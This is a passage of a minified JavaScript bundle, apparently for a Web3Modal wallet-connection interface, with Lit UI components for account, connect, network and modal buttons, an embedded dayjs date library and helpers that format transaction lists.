`;var Yt=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Ct=class extends H{render(){return this.style.cssText=`
      grid-template-rows: ${this.gridTemplateRows};
      grid-template-columns: ${this.gridTemplateColumns};
      justify-items: ${this.justifyItems};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      align-content: ${this.alignContent};
      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};
      padding-top: ${this.padding&&Be.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Be.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Be.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Be.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Be.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Be.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Be.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Be.getSpacingStyles(this.margin,3)};
    `,$`<slot></slot>`}};Ct.styles=[pe,E5];Yt([O()],Ct.prototype,"gridTemplateRows",void 0);Yt([O()],Ct.prototype,"gridTemplateColumns",void 0);Yt([O()],Ct.prototype,"justifyItems",void 0);Yt([O()],Ct.prototype,"alignItems",void 0);Yt([O()],Ct.prototype,"justifyContent",void 0);Yt([O()],Ct.prototype,"alignContent",void 0);Yt([O()],Ct.prototype,"columnGap",void 0);Yt([O()],Ct.prototype,"rowGap",void 0);Yt([O()],Ct.prototype,"gap",void 0);Yt([O()],Ct.prototype,"padding",void 0);Yt([O()],Ct.prototype,"margin",void 0);Ct=Yt([z("wui-grid")],Ct);const C5=q`
  :host {
    position: relative;
    display: flex;
    width: 100%;
    height: 1px;
    background-color: var(--wui-gray-glass-005);
    justify-content: center;
    align-items: center;
  }

  :host > wui-text {
    position: absolute;
    padding: 0px 10px;
    background-color: var(--wui-color-modal-bg);
  }
`;var r1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let fa=class extends H{constructor(){super(...arguments),this.text=""}render(){return $`${this.template()}`}template(){return this.text?$`<wui-text variant="small-500" color="fg-200">${this.text}</wui-text>`:null}};fa.styles=[pe,C5];r1([O()],fa.prototype,"text",void 0);fa=r1([z("wui-separator")],fa);var i1={exports:{}};(function(t,e){(function(n,r){t.exports=r()})(Ed,function(){var n=1e3,r=6e4,o=36e5,i="millisecond",a="second",s="minute",c="hour",l="day",u="week",p="month",m="quarter",g="year",w="date",v="Invalid Date",E=/^(\d{4})[-/]?(\d{1,2})?[-/]?(\d{0,2})[Tt\s]*(\d{1,2})?:?(\d{1,2})?:?(\d{1,2})?[.:]?(\d+)?$/,I=/\[([^\]]+)]|Y{1,4}|M{1,4}|D{1,2}|d{1,4}|H{1,2}|h{1,2}|a|A|m{1,2}|s{1,2}|Z{1,2}|SSS/g,b={name:"en",weekdays:"Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),months:"January_February_March_April_May_June_July_August_September_October_November_December".split("_"),ordinal:function(W){var L=["th","st","nd","rd"],U=W%100;return"["+W+(L[(U-20)%10]||L[U]||L[0])+"]"}},_=function(W,L,U){var B=String(W);return!B||B.length>=L?W:""+Array(L+1-B.length).join(U)+W},x={s:_,z:function(W){var L=-W.utcOffset(),U=Math.abs(L),B=Math.floor(U/60),j=U%60;return(L<=0?"+":"-")+_(B,2,"0")+":"+_(j,2,"0")},m:function W(L,U){if(L.date()<U.date())return-W(U,L);var B=12*(U.year()-L.year())+(U.month()-L.month()),j=L.clone().add(B,p),X=U-j<0,ne=L.clone().add(B+(X?-1:1),p);return+(-(B+(U-j)/(X?j-ne:ne-j))||0)},a:function(W){return W<0?Math.ceil(W)||0:Math.floor(W)},p:function(W){return{M:p,y:g,w:u,d:l,D:w,h:c,m:s,s:a,ms:i,Q:m}[W]||String(W||"").toLowerCase().replace(/s$/,"")},u:function(W){return W===void 0}},C="en",A={};A[C]=b;var f="$isDayjsObject",T=function(W){return W instanceof Y||!(!W||!W[f])},R=function W(L,U,B){var j;if(!L)return C;if(typeof L=="string"){var X=L.toLowerCase();A[X]&&(j=X),U&&(A[X]=U,j=X);var ne=L.split("-");if(!j&&ne.length>1)return W(ne[0])}else{var Q=L.name;A[Q]=L,j=Q}return!B&&j&&(C=j),j||!B&&C},N=function(W,L){if(T(W))return W.clone();var U=typeof L=="object"?L:{};return U.date=W,U.args=arguments,new Y(U)},k=x;k.l=R,k.i=T,k.w=function(W,L){return N(W,{locale:L.$L,utc:L.$u,x:L.$x,$offset:L.$offset})};var Y=function(){function W(U){this.$L=R(U.locale,null,!0),this.parse(U),this.$x=this.$x||U.x||{},this[f]=!0}var L=W.prototype;return L.parse=function(U){this.$d=function(B){var j=B.date,X=B.utc;if(j===null)return new Date(NaN);if(k.u(j))return new Date;if(j instanceof Date)return new Date(j);if(typeof j=="string"&&!/Z$/i.test(j)){var ne=j.match(E);if(ne){var Q=ne[2]-1||0,oe=(ne[7]||"0").substring(0,3);return X?new Date(Date.UTC(ne[1],Q,ne[3]||1,ne[4]||0,ne[5]||0,ne[6]||0,oe)):new Date(ne[1],Q,ne[3]||1,ne[4]||0,ne[5]||0,ne[6]||0,oe)}}return new Date(j)}(U),this.init()},L.init=function(){var U=this.$d;this.$y=U.getFullYear(),this.$M=U.getMonth(),this.$D=U.getDate(),this.$W=U.getDay(),this.$H=U.getHours(),this.$m=U.getMinutes(),this.$s=U.getSeconds(),this.$ms=U.getMilliseconds()},L.$utils=function(){return k},L.isValid=function(){return this.$d.toString()!==v},L.isSame=function(U,B){var j=N(U);return this.startOf(B)<=j&&j<=this.endOf(B)},L.isAfter=function(U,B){return N(U)<this.startOf(B)},L.isBefore=function(U,B){return this.endOf(B)<N(U)},L.$g=function(U,B,j){return k.u(U)?this[B]:this.set(j,U)},L.unix=function(){return Math.floor(this.valueOf()/1e3)},L.valueOf=function(){return this.$d.getTime()},L.startOf=function(U,B){var j=this,X=!!k.u(B)||B,ne=k.p(U),Q=function(Ae,me){var $e=k.w(j.$u?Date.UTC(j.$y,me,Ae):new Date(j.$y,me,Ae),j);return X?$e:$e.endOf(l)},oe=function(Ae,me){return k.w(j.toDate()[Ae].apply(j.toDate("s"),(X?[0,0,0,0]:[23,59,59,999]).slice(me)),j)},Z=this.$W,se=this.$M,de=this.$D,Ee="set"+(this.$u?"UTC":"");switch(ne){case g:return X?Q(1,0):Q(31,11);case p:return X?Q(1,se):Q(0,se+1);case u:var Ce=this.$locale().weekStart||0,ye=(Z<Ce?Z+7:Z)-Ce;return Q(X?de-ye:de+(6-ye),se);case l:case w:return oe(Ee+"Hours",0);case c:return oe(Ee+"Minutes",1);case s:return oe(Ee+"Seconds",2);case a:return oe(Ee+"Milliseconds",3);default:return this.clone()}},L.endOf=function(U){return this.startOf(U,!1)},L.$set=function(U,B){var j,X=k.p(U),ne="set"+(this.$u?"UTC":""),Q=(j={},j[l]=ne+"Date",j[w]=ne+"Date",j[p]=ne+"Month",j[g]=ne+"FullYear",j[c]=ne+"Hours",j[s]=ne+"Minutes",j[a]=ne+"Seconds",j[i]=ne+"Milliseconds",j)[X],oe=X===l?this.$D+(B-this.$W):B;if(X===p||X===g){var Z=this.clone().set(w,1);Z.$d[Q](oe),Z.init(),this.$d=Z.set(w,Math.min(this.$D,Z.daysInMonth())).$d}else Q&&this.$d[Q](oe);return this.init(),this},L.set=function(U,B){return this.clone().$set(U,B)},L.get=function(U){return this[k.p(U)]()},L.add=function(U,B){var j,X=this;U=Number(U);var ne=k.p(B),Q=function(se){var de=N(X);return k.w(de.date(de.date()+Math.round(se*U)),X)};if(ne===p)return this.set(p,this.$M+U);if(ne===g)return this.set(g,this.$y+U);if(ne===l)return Q(1);if(ne===u)return Q(7);var oe=(j={},j[s]=r,j[c]=o,j[a]=n,j)[ne]||1,Z=this.$d.getTime()+U*oe;return k.w(Z,this)},L.subtract=function(U,B){return this.add(-1*U,B)},L.format=function(U){var B=this,j=this.$locale();if(!this.isValid())return j.invalidDate||v;var X=U||"YYYY-MM-DDTHH:mm:ssZ",ne=k.z(this),Q=this.$H,oe=this.$m,Z=this.$M,se=j.weekdays,de=j.months,Ee=j.meridiem,Ce=function(me,$e,Ne,De){return me&&(me[$e]||me(B,X))||Ne[$e].slice(0,De)},ye=function(me){return k.s(Q%12||12,me,"0")},Ae=Ee||function(me,$e,Ne){var De=me<12?"AM":"PM";return Ne?De.toLowerCase():De};return X.replace(I,function(me,$e){return $e||function(Ne){switch(Ne){case"YY":return String(B.$y).slice(-2);case"YYYY":return k.s(B.$y,4,"0");case"M":return Z+1;case"MM":return k.s(Z+1,2,"0");case"MMM":return Ce(j.monthsShort,Z,de,3);case"MMMM":return Ce(de,Z);case"D":return B.$D;case"DD":return k.s(B.$D,2,"0");case"d":return String(B.$W);case"dd":return Ce(j.weekdaysMin,B.$W,se,2);case"ddd":return Ce(j.weekdaysShort,B.$W,se,3);case"dddd":return se[B.$W];case"H":return String(Q);case"HH":return k.s(Q,2,"0");case"h":return ye(1);case"hh":return ye(2);case"a":return Ae(Q,oe,!0);case"A":return Ae(Q,oe,!1);case"m":return String(oe);case"mm":return k.s(oe,2,"0");case"s":return String(B.$s);case"ss":return k.s(B.$s,2,"0");case"SSS":return k.s(B.$ms,3,"0");case"Z":return ne}return null}(me)||ne.replace(":","")})},L.utcOffset=function(){return 15*-Math.round(this.$d.getTimezoneOffset()/15)},L.diff=function(U,B,j){var X,ne=this,Q=k.p(B),oe=N(U),Z=(oe.utcOffset()-this.utcOffset())*r,se=this-oe,de=function(){return k.m(ne,oe)};switch(Q){case g:X=de()/12;break;case p:X=de();break;case m:X=de()/3;break;case u:X=(se-Z)/6048e5;break;case l:X=(se-Z)/864e5;break;case c:X=se/o;break;case s:X=se/r;break;case a:X=se/n;break;default:X=se}return j?X:k.a(X)},L.daysInMonth=function(){return this.endOf(p).$D},L.$locale=function(){return A[this.$L]},L.locale=function(U,B){if(!U)return this.$L;var j=this.clone(),X=R(U,B,!0);return X&&(j.$L=X),j},L.clone=function(){return k.w(this.$d,this)},L.toDate=function(){return new Date(this.valueOf())},L.toJSON=function(){return this.isValid()?this.toISOString():null},L.toISOString=function(){return this.$d.toISOString()},L.toString=function(){return this.$d.toUTCString()},W}(),re=Y.prototype;return N.prototype=re,[["$ms",i],["$s",a],["$m",s],["$H",c],["$W",l],["$M",p],["$y",g],["$D",w]].forEach(function(W){re[W[1]]=function(L){return this.$g(L,W[0],W[1])}}),N.extend=function(W,L){return W.$i||(W(L,Y,N),W.$i=!0),N},N.locale=R,N.isDayjs=T,N.unix=function(W){return N(1e3*W)},N.en=A[C],N.Ls=A,N.p={},N})})(i1);var S5=i1.exports;const ha=$c(S5);var o1={exports:{}};(function(t,e){(function(n,r){t.exports=r()})(Ed,function(){return function(n,r,o){o.updateLocale=function(i,a){var s=o.Ls[i];if(s)return(a?Object.keys(a):[]).forEach(function(c){s[c]=a[c]}),s}}})})(o1);var A5=o1.exports;const T5=$c(A5);var a1={exports:{}};(function(t,e){(function(n,r){t.exports=r()})(Ed,function(){return function(n,r,o){n=n||{};var i=r.prototype,a={future:"in %s",past:"%s ago",s:"a few seconds",m:"a minute",mm:"%d minutes",h:"an hour",hh:"%d hours",d:"a day",dd:"%d days",M:"a month",MM:"%d months",y:"a year",yy:"%d years"};function s(l,u,p,m){return i.fromToBase(l,u,p,m)}o.en.relativeTime=a,i.fromToBase=function(l,u,p,m,g){for(var w,v,E,I=p.$locale().relativeTime||a,b=n.thresholds||[{l:"s",r:44,d:"second"},{l:"m",r:89},{l:"mm",r:44,d:"minute"},{l:"h",r:89},{l:"hh",r:21,d:"hour"},{l:"d",r:35},{l:"dd",r:25,d:"day"},{l:"M",r:45},{l:"MM",r:10,d:"month"},{l:"y",r:17},{l:"yy",d:"year"}],_=b.length,x=0;x<_;x+=1){var C=b[x];C.d&&(w=m?o(l).diff(p,C.d,!0):p.diff(l,C.d,!0));var A=(n.rounding||Math.round)(Math.abs(w));if(E=w>0,A<=C.r||!C.r){A<=1&&x>0&&(C=b[x-1]);var f=I[C.l];g&&(A=g(""+A)),v=typeof f=="string"?f.replace("%d",A):f(A,u,C.l,E);break}}if(u)return v;var T=E?I.future:I.past;return typeof T=="function"?T(v):T.replace("%s",v)},i.to=function(l,u){return s(l,u,this,!0)},i.from=function(l,u){return s(l,u,this)};var c=function(l){return l.$u?o.utc():o()};i.toNow=function(l){return this.to(c(this),l)},i.fromNow=function(l){return this.from(c(this),l)}}})})(a1);var I5=a1.exports;const $5=$c(I5);ha.extend($5);ha.extend(T5);ha.updateLocale("en",{relativeTime:{future:"in %s",past:"%s ago",s:"%s sec",m:"1 min",mm:"%d min",h:"1 hr",hh:"%d hrs",d:"1 d",dd:"%d d",M:"1 mo",MM:"%d mo",y:"1 yr",yy:"%d yr"}});const s1={getYear(t=new Date().toISOString()){return ha(t).year()},getRelativeDateFromNow(t){return ha(t).fromNow(!0)}},O5=3,P5=["receive","deposit","borrow","claim"],D5=["withdraw","repay","burn"],Br={getTransactionGroupTitle(t){const e=s1.getYear();return t===e?"This Year":t},getTransactionImages(t){const[e,n]=t,r=!!e&&(t==null?void 0:t.every(a=>!!a.nft_info)),o=(t==null?void 0:t.length)>1;return(t==null?void 0:t.length)===2&&!r?[this.getTransactionImage(e),this.getTransactionImage(n)]:o?t.map(a=>this.getTransactionImage(a)):[this.getTransactionImage(e)]},getTransactionImage(t){return{type:Br.getTransactionTransferTokenType(t),url:Br.getTransactionImageURL(t)}},getTransactionImageURL(t){var o,i,a,s,c;let e=null;const n=!!(t!=null&&t.nft_info),r=!!(t!=null&&t.fungible_info);return t&&n?e=(a=(i=(o=t==null?void 0:t.nft_info)==null?void 0:o.content)==null?void 0:i.preview)==null?void 0:a.url:t&&r&&(e=(c=(s=t==null?void 0:t.fungible_info)==null?void 0:s.icon)==null?void 0:c.url),e},getTransactionTransferTokenType(t){return t!=null&&t.fungible_info?"FUNGIBLE":t!=null&&t.nft_info?"NFT":null},getTransactionDescriptions(t){var p,m,g;const e=(p=t.metadata)==null?void 0:p.operationType,n=t.transfers,r=((m=t.transfers)==null?void 0:m.length)>0,o=((g=t.transfers)==null?void 0:g.length)>1,i=r&&(n==null?void 0:n.every(w=>!!w.fungible_info)),[a,s]=n;let c=this.getTransferDescription(a),l=this.getTransferDescription(s);if(!r)return(e==="send"||e==="receive")&&i?(c=Be.getTruncateString({string:t.metadata.sentFrom,charsStart:4,charsEnd:6,truncate:"middle"}),l=Be.getTruncateString({string:t.metadata.sentTo,charsStart:4,charsEnd:6,truncate:"middle"}),[c,l]):[t.metadata.status];if(o)return n.map(w=>this.getTransferDescription(w));let u="";return P5.includes(e)?u="+":D5.includes(e)&&(u="-"),c=u.concat(c),[c]},getTransferDescription(t){var n;let e="";return t&&(t!=null&&t.nft_info?e=((n=t==null?void 0:t.nft_info)==null?void 0:n.name)||"-":t!=null&&t.fungible_info&&(e=this.getFungibleTransferDescription(t)||"-")),e},getFungibleTransferDescription(t){var r;return t?[this.getQuantityFixedValue(t==null?void 0:t.quantity.numeric),(r=t==null?void 0:t.fungible_info)==null?void 0:r.symbol].join(" ").trim():null},getQuantityFixedValue(t){return t?parseFloat(t).toFixed(O5):null}},R5=Object.freeze(Object.defineProperty({__proto__:null,TransactionUtil:Br,UiHelperUtil:Be,get WuiAccountButton(){return Gt},get WuiAllWalletsImage(){return oa},get WuiAvatar(){return Jr},get WuiButton(){return sn},get WuiCard(){return Ns},get WuiCardSelect(){return Cn},get WuiCardSelectLoader(){return aa},get WuiChip(){return Sn},get WuiConnectButton(){return ji},get WuiCtaButton(){return Xr},get WuiEmailInput(){return Qr},get WuiFlex(){return bt},get WuiGrid(){return Ct},get WuiIcon(){return qr},get WuiIconBox(){return Zt},get WuiIconLink(){return pr},get WuiImage(){return Bi},get WuiInputElement(){return sa},get WuiInputNumeric(){return ca},get WuiInputText(){return cn},get WuiLink(){return Fi},get WuiListAccordion(){return Yi},get WuiListContent(){return ni},get WuiListItem(){return jt},get WuiListWallet(){return Dt},get WuiListWalletTransaction(){return gr},get WuiLoadingHexagon(){return ks},get WuiLoadingSpinner(){return Li},get WuiLoadingThumbnail(){return ra},get WuiLogo(){return ua},get WuiLogoSelect(){return Wi},get WuiNetworkButton(){return zi},get WuiNetworkImage(){return hr},get WuiNoticeCard(){return ti},get WuiOtp(){return Hi},get WuiQrCode(){return zn},get WuiSearchBar(){return js},get WuiSeparator(){return fa},get WuiShimmer(){return Kr},get WuiSnackbar(){return mr},get WuiTabs(){return un},get WuiTag(){return la},get WuiText(){return Yr},get WuiTooltip(){return Ki},get WuiTransactionListItem(){return ln},get WuiTransactionListItemLoader(){return Us},get WuiTransactionVisual(){return An},get WuiVisual(){return ia},get WuiVisualThumbnail(){return ei},get WuiWalletImage(){return En},customElement:z,initializeTheming:Ap,setColorTheme:Rd,setThemeVariables:Tp},Symbol.toStringTag,{value:"Module"}));var mn=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let qt=class extends H{constructor(){super(),this.unsubscribe=[],this.disabled=!1,this.balance="show",this.charsStart=4,this.charsEnd=6,this.address=ke.state.address,this.balanceVal=ke.state.balance,this.balanceSymbol=ke.state.balanceSymbol,this.profileName=ke.state.profileName,this.profileImage=ke.state.profileImage,this.network=Qe.state.caipNetwork,this.unsubscribe.push(ke.subscribe(e=>{e.isConnected?(this.address=e.address,this.balanceVal=e.balance,this.profileName=e.profileName,this.profileImage=e.profileImage,this.balanceSymbol=e.balanceSymbol):(this.address="",this.balanceVal="",this.profileName="",this.profileImage="",this.balanceSymbol="")}),Qe.subscribeKey("caipNetwork",e=>this.network=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=Xe.getNetworkImage(this.network),n=this.balance==="show";return $`
      <wui-account-button
        .disabled=${!!this.disabled}
        address=${ve(this.profileName??this.address)}
        ?isProfileName=${!!this.profileName}
        networkSrc=${ve(e)}
        avatarSrc=${ve(this.profileImage)}
        balance=${n?le.formatBalance(this.balanceVal,this.balanceSymbol):""}
        @click=${this.onClick.bind(this)}
        data-testid="account-button"
        .charsStart=${this.charsStart}
        .charsEnd=${this.charsEnd}
      >
      </wui-account-button>
    `}onClick(){ze.open()}};mn([O({type:Boolean})],qt.prototype,"disabled",void 0);mn([O()],qt.prototype,"balance",void 0);mn([O()],qt.prototype,"charsStart",void 0);mn([O()],qt.prototype,"charsEnd",void 0);mn([ee()],qt.prototype,"address",void 0);mn([ee()],qt.prototype,"balanceVal",void 0);mn([ee()],qt.prototype,"balanceSymbol",void 0);mn([ee()],qt.prototype,"profileName",void 0);mn([ee()],qt.prototype,"profileImage",void 0);mn([ee()],qt.prototype,"network",void 0);qt=mn([z("w3m-account-button")],qt);var Yn=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Tn=class extends H{constructor(){super(),this.unsubscribe=[],this.disabled=!1,this.balance=void 0,this.size=void 0,this.label=void 0,this.loadingLabel=void 0,this.charsStart=4,this.charsEnd=6,this.isAccount=ke.state.isConnected,this.unsubscribe.push(ke.subscribeKey("isConnected",e=>{this.isAccount=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return this.isAccount?$`
          <w3m-account-button
            .disabled=${!!this.disabled}
            balance=${ve(this.balance)}
            .charsStart=${ve(this.charsStart)}
            .charsEnd=${ve(this.charsEnd)}
          >
          </w3m-account-button>
        `:$`
          <w3m-connect-button
            size=${ve(this.size)}
            label=${ve(this.label)}
            loadingLabel=${ve(this.loadingLabel)}
          ></w3m-connect-button>
        `}};Yn([O({type:Boolean})],Tn.prototype,"disabled",void 0);Yn([O()],Tn.prototype,"balance",void 0);Yn([O()],Tn.prototype,"size",void 0);Yn([O()],Tn.prototype,"label",void 0);Yn([O()],Tn.prototype,"loadingLabel",void 0);Yn([O()],Tn.prototype,"charsStart",void 0);Yn([O()],Tn.prototype,"charsEnd",void 0);Yn([ee()],Tn.prototype,"isAccount",void 0);Tn=Yn([z("w3m-button")],Tn);var fo=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ri=class extends H{constructor(){super(),this.unsubscribe=[],this.size="md",this.label="Connect Wallet",this.loadingLabel="Connecting...",this.open=ze.state.open,this.loading=ze.state.loading,this.unsubscribe.push(ze.subscribe(e=>{this.open=e.open,this.loading=e.loading}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.loading||this.open;return $`
      <wui-connect-button
        size=${ve(this.size)}
        .loading=${e}
        @click=${this.onClick.bind(this)}
        data-testid="connect-button"
      >
        ${e?this.loadingLabel:this.label}
      </wui-connect-button>
    `}onClick(){this.open?ze.close():ze.open()}};fo([O()],ri.prototype,"size",void 0);fo([O()],ri.prototype,"label",void 0);fo([O()],ri.prototype,"loadingLabel",void 0);fo([ee()],ri.prototype,"open",void 0);fo([ee()],ri.prototype,"loading",void 0);ri=fo([z("w3m-connect-button")],ri);const N5=q`
  :host {
    z-index: var(--w3m-z-index);
    display: block;
    backface-visibility: hidden;
    will-change: opacity;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    pointer-events: none;
    opacity: 0;
    background-color: var(--wui-cover);
  }

  @keyframes zoom-in {
    0% {
      transform: scale(0.95) translateY(0);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  @keyframes slide-in {
    0% {
      transform: scale(1) translateY(50px);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  wui-card {
    max-width: 360px;
    width: 100%;
    position: relative;
    animation-delay: 0.3s;
    animation-duration: 0.2s;
    animation-name: zoom-in;
    animation-fill-mode: backwards;
    animation-timing-function: var(--wui-ease-out-power-2);
    outline: none;
  }

  wui-flex {
    overflow-x: hidden;
    overflow-y: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 100%;
  }

  @media (max-height: 700px) and (min-width: 431px) {
    wui-flex {
      align-items: flex-start;
    }

    wui-card {
      margin: var(--wui-spacing-xxl) 0px;
    }
  }

  @media (max-width: 430px) {
    wui-flex {
      align-items: flex-end;
    }

    wui-card {
      max-width: 100%;
      border-bottom-left-radius: 0;
      border-bottom-right-radius: 0;
      border-bottom: none;
      animation-name: slide-in;
    }
  }
`;var Gc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const u0="scroll-lock";let ii=class extends H{constructor(){super(),this.unsubscribe=[],this.abortController=void 0,this.open=ze.state.open,this.caipAddress=ke.state.address,this.isSiweEnabled=nt.state.isSiweEnabled,this.initializeTheming(),Pe.prefetch(),this.unsubscribe.push(ze.subscribeKey("open",e=>e?this.onOpen():this.onClose()),nt.subscribeKey("isSiweEnabled",e=>{this.isSiweEnabled=e}),ke.subscribe(e=>this.onNewAccountState(e))),we.sendEvent({type:"track",event:"MODAL_LOADED"})}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),this.onRemoveKeyboardListener()}render(){return this.open?$`
          <wui-flex @click=${this.onOverlayClick.bind(this)}>
            <wui-card role="alertdialog" aria-modal="true" tabindex="0">
              <w3m-header></w3m-header>
              <w3m-router></w3m-router>
              <w3m-snackbar></w3m-snackbar>
            </wui-card>
          </wui-flex>
        `:null}async onOverlayClick(e){e.target===e.currentTarget&&await this.handleClose()}async handleClose(){this.isSiweEnabled&&nt.state.status!=="success"&&await Re.disconnect(),ze.close()}initializeTheming(){const{themeVariables:e,themeMode:n}=It.state,r=Be.getColorTheme(n);Ap(e,r)}async onClose(){this.onScrollUnlock(),await this.animate([{opacity:1},{opacity:0}],{duration:200,easing:"ease",fill:"forwards"}).finished,et.hide(),this.open=!1,this.onRemoveKeyboardListener()}async onOpen(){this.onScrollLock(),this.open=!0,await this.animate([{opacity:0},{opacity:1}],{duration:200,easing:"ease",fill:"forwards",delay:300}).finished,this.onAddKeyboardListener()}onScrollLock(){const e=document.createElement("style");e.dataset.w3m=u0,e.textContent=`
      html, body {
        touch-action: none;
        overflow: hidden;
        overscroll-behavior: contain;
      }
      w3m-modal {
        pointer-events: auto;
      }
    `,document.head.appendChild(e)}onScrollUnlock(){const e=document.head.querySelector(`style[data-w3m="${u0}"]`);e&&e.remove()}onAddKeyboardListener(){var n;this.abortController=new AbortController;const e=(n=this.shadowRoot)==null?void 0:n.querySelector("wui-card");e==null||e.focus(),window.addEventListener("keydown",r=>{if(r.key==="Escape")this.handleClose();else if(r.key==="Tab"){const{tagName:o}=r.target;o&&!o.includes("W3M-")&&!o.includes("WUI-")&&(e==null||e.focus())}},this.abortController)}onRemoveKeyboardListener(){var e;(e=this.abortController)==null||e.abort(),this.abortController=void 0}async onNewAccountState(e){const{isConnected:n,caipAddress:r}=e;if(this.isSiweEnabled){n&&!this.caipAddress&&(this.caipAddress=r),n&&r&&this.caipAddress!==r&&(await nt.signOut(),this.onSiweNavigation(),this.caipAddress=r);try{const o=await nt.getSession();o&&!n?await nt.signOut():n&&!o&&this.onSiweNavigation()}catch{n&&this.onSiweNavigation()}}}onSiweNavigation(){this.open?ie.push("ConnectingSiwe"):ze.open({view:"ConnectingSiwe"})}};ii.styles=N5;Gc([ee()],ii.prototype,"open",void 0);Gc([ee()],ii.prototype,"caipAddress",void 0);Gc([ee()],ii.prototype,"isSiweEnabled",void 0);ii=Gc([z("w3m-modal")],ii);const k5=Object.freeze(Object.defineProperty({__proto__:null,get W3mModal(){return ii}},Symbol.toStringTag,{value:"Module"}));var qa=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Ji=class extends H{constructor(){super(),this.unsubscribe=[],this.disabled=!1,this.network=Qe.state.caipNetwork,this.connected=ke.state.isConnected,this.loading=ze.state.loading,this.unsubscribe.push(Qe.subscribeKey("caipNetwork",e=>this.network=e),ke.subscribeKey("isConnected",e=>this.connected=e),ze.subscribeKey("loading",e=>this.loading=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){var e;return $`
      <wui-network-button
        .disabled=${!!(this.disabled||this.loading)}
        imageSrc=${ve(Xe.getNetworkImage(this.network))}
        @click=${this.onClick.bind(this)}
      >
        ${((e=this.network)==null?void 0:e.name)??(this.connected?"Unknown Network":"Select Network")}
      </wui-network-button>
    `}onClick(){ze.open({view:"Networks"})}};qa([O({type:Boolean})],Ji.prototype,"disabled",void 0);qa([ee()],Ji.prototype,"network",void 0);qa([ee()],Ji.prototype,"connected",void 0);qa([ee()],Ji.prototype,"loading",void 0);Ji=qa([z("w3m-network-button")],Ji);const M5=q`
  :host {
    display: block;
    will-change: transform, opacity;
  }
